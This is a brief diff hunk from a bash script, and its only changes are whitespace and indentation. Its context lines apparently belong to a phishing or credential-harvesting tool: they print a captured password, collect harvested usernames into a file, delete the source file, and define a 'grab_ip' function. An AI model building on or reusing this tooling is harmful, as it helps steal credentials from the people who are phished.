@@ -242,13 +242,8 @@ echo -e $red Password:  $password
 cat pd/www/usernames.txt >> usernames.txt
 echo -e $red Press Ctrl + C
 rm -rf pd/www/usernames.txt
-fi
-
-
+   fi
 }
-
-
-
 
 
 grab_ip() {
